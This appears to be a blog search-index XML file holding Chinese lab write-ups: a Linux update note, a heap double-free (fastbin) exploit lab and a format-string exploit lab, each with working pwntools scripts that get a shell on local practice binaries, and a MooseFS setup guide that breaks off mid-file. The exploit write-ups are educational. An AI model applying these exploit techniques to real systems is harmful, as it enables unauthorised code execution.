<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux更新系统软件</title>
      <link href="/Linux%E6%9B%B4%E6%8D%A2%E6%BA%90.html"/>
      <url>/Linux%E6%9B%B4%E6%8D%A2%E6%BA%90.html</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h1><p>&lt;–!more–&gt;</p><ol><li><code>sudo apt update</code> / <code>sudo apt-get update</code>(低于16.04)</li><li>查看可更新软件：<code>apt list --upgradable</code></li><li>进行更新操作：<code>sudo apt upgrade</code></li><li>清除不需要的旧组件：<code>sudo apt autoremove</code></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> -Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞分析技术实验四</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E5%9B%9B.html"/>
      <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E5%9B%9B.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握堆漏洞中<code>fastbinattack</code>的原理和重复释放漏洞的利用方法.</p><a id="more"></a><h1 id="实验条件"><a href="#实验条件" class="headerlink" title="实验条件"></a>实验条件</h1><ol><li>操作系统：Linux</li><li>语言环境：python</li><li>调试器：gdb、IDA Pro</li></ol><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol><li>对被攻击程序的漏洞利用过程进行详细分析；</li><li>详细列出重复释放漏洞利用过程中 ，<code>fastbin</code>在4次<code>malloc</code>过程中的变化情况，以及<code>system()</code>函数地址被写入和<code>system(/bin/sh)</code>调用被调用的过程；</li></ol><h1 id="四、程序分析"><a href="#四、程序分析" class="headerlink" title="四、程序分析"></a>四、程序分析</h1><p>通过IDA对程序进行反编译，发现程序提供了四种操作<code>new</code>、<code>write</code>、<code>delete</code>、<code>exit</code>，对它们分别进行分析；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202201737.png" alt=""></p><h2 id="new"><a href="#new" class="headerlink" title="new"></a><code>new</code></h2><p>用于<code>malloc</code>分配堆块，但限制最多只能分配九个堆块，并且限制了分配的大小小于96大于0，并且将<code>malloc(v2)</code>后的指针赋值给ptr，由于ptr数组是未被初始化的，因此ptr位于bss段；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202202050.png" alt=""></p><h2 id="write"><a href="#write" class="headerlink" title="write"></a><code>write</code></h2><p>用于在<code>ptr[i]</code>指向的位置直接进行read写操作，如果可以控制<code>prt[i]</code>的内容，就可以完成任意写；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202202533.png" alt=""></p><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a><code>delete</code></h2><p>函数中使用<code>free</code>释放空间后，<code>ptr</code>指针没有清零，造成DouobleFree漏洞；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202202935.png" alt=""></p><h2 id="system"><a href="#system" class="headerlink" title="system"></a><code>system</code></h2><p>程序存在system函数，位于<code>0x4006E0</code>处，可以通过system函数实现<code>/bin/sh</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202203513.png" alt=""></p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>程序限制了malloc的大小，使得new只能申请到fastbin，所以利用fastbin attack来构造特定的chunk单链表链。</p><p>程序可以申请的大小为96字节(<code>0x60</code>，再加上<code>size</code>与<code>prev_size</code>各8字节，一共是<code>0x70</code>， 在fastbin中会位于<code>0x70</code>的位置。 </p><p>分析四次malloc过程中，fastbin的变化情况：</p><h2 id="第一次malloc"><a href="#第一次malloc" class="headerlink" title="第一次malloc"></a>第一次<code>malloc</code></h2><p>首先进行第一次double free ，查看fastbin中的指针变化，步骤为</p><ul><li><p>按照顺序申请chunk0、chunk1；</p></li><li><p>按照顺序释放chunk0、chunk1、chunk0；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 0</span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br><span class="line">Delete(p, <span class="number">1</span>)</span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在申请chunk之前，fastbin如下：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202220931.png" alt=""></p></li><li><p>申请两个chunk之后，将chunk分配到fastbin中，其中堆顶的位置为<code>0xb2c0e0</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202231533.png" alt=""></p></li><li><p>当free<code>chunk0</code>之后，<code>chunk0</code>被放进fastbin里面，地址为<code>0xb2c000</code>;</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202231645.png" alt=""></p></li><li><p>free<code>chunk1</code>之后，<code>chunk1</code>被放进fastbin中，<code>chunk1</code>指向<code>chunk0</code>，<code>fd</code>表示了 下一个未被使用的<code>chunk</code>的地址，这时后free的<code>chunk1</code>成为了fastbin中的首个<code>chunk</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202231828.png" alt=""></p></li><li><p>再次执行free<code>chunk0</code>时，由于fastbin在执行free的时候仅验证了链表指针头部的块，对于链表后面的块，并没有进行验证。所以再次free<code>chunk0</code>的时候，实际上是把<code>chunk0</code>又加到了链的开头；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202232353.png" alt=""></p></li></ul><h2 id="第二次malloc"><a href="#第二次malloc" class="headerlink" title="第二次malloc"></a>第二次<code>malloc</code></h2><p>在<code>double free</code>之后，我们使得链表的形式为<code>0xb2c000—▸0xb2c070◂—0xb2c000</code>，再次<code>malloc</code>时，会从链表末尾取下一个块，直接分配给用户，所以malloc到的2号实际上是<code>0xb2c000</code>，对该块进行编辑时，编辑起始的位置是<code>0xb2c0e0</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 2 </span></span><br><span class="line">Write(p, <span class="number">2</span>, p64(<span class="number">0x60208d</span>))</span><br></pre></td></tr></table></figure><p>在执行过write 2 之后，地址<code>0xb2c070</code>位置被改变了，变成了<code>0x60208d</code>。由于<code>0xb2c000</code>仍然被记录在链表中，所以fastbins中链表的最后一项也发生了改变；</p><p>修改了的fastbin链表，导致的是0x60208d这块被当做了fastbin的一个块，在分配的时候，申请的0x60大小实际上会分配0x70大小，而0x7f，也就是图中的0x60802d开始的第二个字节，恰好满足分配的条件，如果再往左或往右偏移，会出现不满足条件的情况；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202233043.png" alt=""></p><p>接下来进行了三次<code>malloc</code>操作，每一次<code>malloc</code>操作都会从fastbin链表头取一个块进行分配；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 3 </span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 4 </span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><ul><li><p>取第一个块进行分配，分配<code>0xb2c070</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202233833.png" alt=""></p></li><li><p>取第二个块进行分配，分配<code>0xb2c000</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202234038.png" alt=""></p></li><li><p>第三次分配，把<code>0xb2c070</code>写入<code>ptr[5]</code>中，fastbin只剩下了之前0x60208d这个地址里面的内容；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202234547.png" alt=""></p></li><li><p>查看<code>ptr</code>所在的地方，可以看到<code>ptr[0]=ptr[2]=ptr[4]</code>、<code>ptr[1]=ptr[3]</code>，而<code>ptr[5]</code>是<code>bss</code>段上的一个地址；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202234841.png" alt=""></p></li></ul><h2 id="第三次malloc"><a href="#第三次malloc" class="headerlink" title="第三次malloc"></a>第三次<code>malloc</code></h2><p>接下来需要进行任意写，更改<code>got</code>表里某一函数的地址为system，并写入参数<code>/bin/sh</code>；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Write(p, <span class="number">4</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">3</span> + p64(elf.got[<span class="string">'free'</span>]) * <span class="number">3</span></span><br><span class="line">Write(p, <span class="number">5</span>, payload)</span><br><span class="line">Write(p, <span class="number">2</span>, p64(elf.plt[<span class="string">'system'</span>]))</span><br><span class="line">Delete(p, <span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202235645.png" alt=""></p><p>在向5写入payload之后，也就是向<code>bss</code>段上的<code>ptr</code>写入payload，把0、1、2这三个的<code>ptr</code>都改为了free的got所在的地址<code>0x602018</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203000504.png" alt=""></p><p><code>ptr</code>地址</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203000629.png" alt=""></p><p>执行write 2之后，free函数<code>got</code>表的位置，理论上被写成<code>system</code>函数的地址，但是由于掌握不熟练，一直没有调试到地址位置<code>0x4006E0</code>；</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a><code>get shell</code></h2><p>此时程序已经<code>get shell</code>完毕，可以执行命令如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203002114.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析技术实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重复释放漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞分析技术实验三</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89.html"/>
      <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用.</p><a id="more"></a><h1 id="实验条件"><a href="#实验条件" class="headerlink" title="实验条件"></a>实验条件</h1><ol><li>操作系统：Linux</li><li>语言环境：python</li><li>调试器：gdb、IDA Pro</li></ol><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><p>利用格式化字符串修改返回地址，以在函数返回时获取shell。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p>检查保护，发现开启了<code>RELRO</code>和<code>NX</code>保护；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191114233347.png" alt=""></p></li><li><p>通过IDA进行反编译，发现在函数<code>sub_400B07</code>中存在格式化字符串漏洞，分析是由<code>printf(buf)</code>造成的；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191114233900.png" alt=""></p></li><li><p>查看函数<code>sub_400B07</code>中的汇编语句<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191114234539.png" alt=""></p></li><li><p>发现<code>printf</code>只压入了一个格式化的<code>format</code>参数,没有其它参数，下述根据程序运行过程可知，<code>sub_400B07</code>函数用于执行选项1，查看用户信息；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.Sh0w Account Infomation!#查看用户信息，不需要参数</span><br><span class="line">2.Ed1t Account Inf0mation!#编辑用户信息，需要参数</span><br><span class="line">3.QUit sangebaimao:(#退出</span><br></pre></td></tr></table></figure></li><li><p>使用gdb在<code>0x400B28</code>处下断点进行调试，输入用户名、密码为<code>qq</code>，选择选项1，运行到断点出；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115014326.png" alt=""><br>发现要执行的命令为<code>call 0x400770</code>，而<code>0x400770</code>是<code>GOT</code>表中<code>printf</code>函数<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115014234.png" alt=""></p></li><li><p>根据64位系统的特征，前六个参数会依次存放在<code>rdi</code>、<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>中，之后的参数才存放在栈上，因为<code>rdi</code>中存放了<code>format</code>参数，所以<code>rsi</code>存放了<code>printf</code>函数的第1个实际参数，<code>r9</code>存放了第5个实际参数，那么栈顶第一个元素就是第6个实际参数，因此通过构造username的值为<code>%6$p</code>，将栈顶的第一个元素输出；</p></li><li><p>根据上图调试栈中的内容，<code>0x7fffffffddb8</code>是栈顶第二个元素，存放了返回地址，而栈顶第一个元素存放了一个地址<code>0x74ffffffddf0</code>，后者减去前者得到<code>0x38</code>，因此只要泄露栈顶内容，再减去<code>0x38</code>，即可得到函数返回地址在栈中的位置，进而进行覆盖；</p></li><li><p>构造脚本如下，即可找到泄露出的返回地址在栈中的位置为<code>0x7ffd6ee4a728</code>(每次运行返回地址都在变化)；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./pwnme_k0"</span>)</span><br><span class="line">r.recv() </span><br><span class="line">r.sendline(<span class="string">"%6$p"</span>) </span><br><span class="line">r.recv() </span><br><span class="line">r.sendline(<span class="string">"mypassword"</span>) </span><br><span class="line">r.recv() r.sendline(<span class="string">"1"</span>) </span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>) </span><br><span class="line">retn_addr = int(r.recvline().strip(), <span class="number">16</span>) - <span class="number">0x38</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"retn_addr = "</span> + hex(retn_addr)</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115020247.png" alt=""></p></li><li><p>分析栈中内容，发现<code>username</code>相当于<code>printf</code>的第8个参数，想要把返回地址覆盖，可以使用<code>% num $ hn</code>，就是把本次输出的字节数写入到第num个参数指向的位置 </p></li><li><p>从IDA中很明显可以找到system(“/bin/sh”)的地址为<code>0x4008a6</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115021245.png" alt=""></p></li><li><p>因此，只需要编辑用户资料，将username改为函数返回地址（栈顶的第二个元素），将password改为<code>%2214d%8$hn</code>，即把<code>0x08a6</code>写入到username指向的位置(<code>0x086a==2214d</code>)，改完后查看用户资料，调出<code>/bin/sh</code>；</p></li><li><p>脚本如下；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwnme_k0"</span>)</span><br><span class="line"><span class="comment">#泄露返回地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"mypassword"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">retn_addr = int(p.recvline().strip(),<span class="number">16</span>)<span class="number">-0x38</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"retn_addr="</span>+hex(retn_addr)</span><br><span class="line"><span class="comment">#利用%num$hn覆写返回地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(retn_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"%2214d%8$hn"</span>)</span><br><span class="line"><span class="comment">#查看用户资料从而调用/bin/sh </span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>执行脚本，成功getshell.<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115023952.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析技术实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核 实验七</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%83.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%83.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>以MooseFS-PB分布式文件系统为例，了解分布式文件系统实现方法，功能特点及作用.</p><a id="more"></a><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ol><li><p><code>master server</code>: <code>Ubuntu 18.04</code> </p><p>IP: <code>10.128.255.181</code></p></li><li><p>元数据日志服务器: <code>Ubuntu 16.04</code> </p><p>IP: <code>10.128.243.103</code></p></li><li><p><code>chunk server</code>: <code>Ubuntu 16.04</code> </p><p>IP: <code>10.128.219.79</code></p></li><li><p>客户端: <code>Ubuntu 16.04</code> </p><p>IP: <code>10.128.205.7</code></p></li></ol><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="搭建master-server"><a href="#搭建master-server" class="headerlink" title="搭建master server"></a>搭建<code>master server</code></h2><h3 id="安装编译器、工具包"><a href="#安装编译器、工具包" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol><li><p>输入如下命令，安装相关编译器、工具包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103043.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103126.png" alt=""></p></li><li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/<span class="built_in">local</span>/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103228.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103315.png" alt=""></p></li><li><p>修改输出目录配置文件、定义挂载以及权限设定文件、主配置文件、元数据日志文件信息；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mfs/etc/mfs/</span><br><span class="line"><span class="comment">#修改输出目录配置文件，定义挂载以及权限设定文件</span></span><br><span class="line">$ sudo cp mfsexports.cfg.sample  mfsexports.cfg</span><br><span class="line"><span class="comment">#修改主配置文件</span></span><br><span class="line">$ sudo cp mfsmaster.cfg.sample mfsmaster.cfg</span><br><span class="line"><span class="comment">#修改元数据日志文件</span></span><br><span class="line">$ sudo cp mfstopology.cfg.sample  mfstopology.cfg</span><br><span class="line"><span class="comment">#修改master元数据文件</span></span><br><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mfs/var/mfs/</span><br><span class="line">$ sudo cp metadata.mfs.empty metadata.mfs</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103559.png" alt=""></p></li></ol><h3 id="启动master-server"><a href="#启动master-server" class="headerlink" title="启动master server"></a>启动<code>master server</code></h3><ol><li><p>创建进程用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li><li><p>授权、优化路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown -R mfs.mfs /usr/<span class="built_in">local</span>/mfs</span><br><span class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/mfs/sbin/* /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103748.png" alt=""></p></li><li><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mfsmaster start</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217103816.png" alt=""></p></li><li><p>查看服务运行成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfsmaster</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217104015.png" alt=""></p></li></ol><h2 id="搭建元数据日志服务器"><a href="#搭建元数据日志服务器" class="headerlink" title="搭建元数据日志服务器"></a>搭建元数据日志服务器</h2><h3 id="安装编译器、工具包-1"><a href="#安装编译器、工具包-1" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol><li><p>输入如下命令，安装相关编译器、工具包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217111359.png" alt=""></p></li><li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> moosefs/</span><br><span class="line">$ sudo ./configure --prefix=/usr/<span class="built_in">local</span>/mfs --with-default-user=mfs --with-default-group=mfs</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217111630.png" alt=""></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217111710.png" alt=""></p></li><li><p>修改主配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mfs/etc/mfs/</span><br><span class="line">$ sudo cp mfsmaster.cfg.sample mfsmaster.cfg</span><br><span class="line">$ sudo cp mfsexports.cfg.sample mfsexports.cfg</span><br><span class="line">$ sudo cp mfsmetalogger.cfg.sample mfsmetalogger.cfg</span><br><span class="line">$ sudo <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mfs/var/mfs</span><br><span class="line">$ sudo cp metadata.mfs.empty metadata.mfs</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217112115.png" alt=""></p><p>修改<code>mfsmetalogger.cfg</code>文件内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/mfs/etc/mfs/</span><br><span class="line">$ sudo vi mfsmetalogger.cfg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MASTER_HOST &#x3D; 10.128.255.181 #执行master服务器的ip地址</span><br><span class="line">META_DOWNLOAD_FREQ &#x3D; 24 #备份频率时间</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217112527.png" alt=""></p></li></ol><h3 id="启动元数据日志服务器"><a href="#启动元数据日志服务器" class="headerlink" title="启动元数据日志服务器"></a>启动元数据日志服务器</h3><ol><li><p>创建进程用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -s /sbin/nologin mfs</span><br></pre></td></tr></table></figure></li><li><p>授权、优化路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown -R mfs.mfs /usr/<span class="built_in">local</span>/mfs</span><br><span class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/mfs/sbin/* /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure></li><li><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mfsmetalogger start</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217113220.png" alt=""></p></li><li><p>查看服务运行成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -anpt | grep mfsmetalogger</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217113318.png" alt=""></p></li></ol><h2 id="搭建chunk-server"><a href="#搭建chunk-server" class="headerlink" title="搭建chunk server"></a>搭建<code>chunk server</code></h2><h3 id="安装编译器、工具包-2"><a href="#安装编译器、工具包-2" class="headerlink" title="安装编译器、工具包"></a>安装编译器、工具包</h3><ol><li><p>输入如下命令，安装相关编译器、工具包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install build-essential libpcap-dev zlib1g-dev libfuse-dev pkg-config</span><br><span class="line">$ sudo apt install fuse</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191217115449.png" alt=""></p></li><li><p>将moosefs源码拷贝到到<code>/moosefs</code>目录下，进入<code>/moosefs</code>目录安装mfs软件包；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 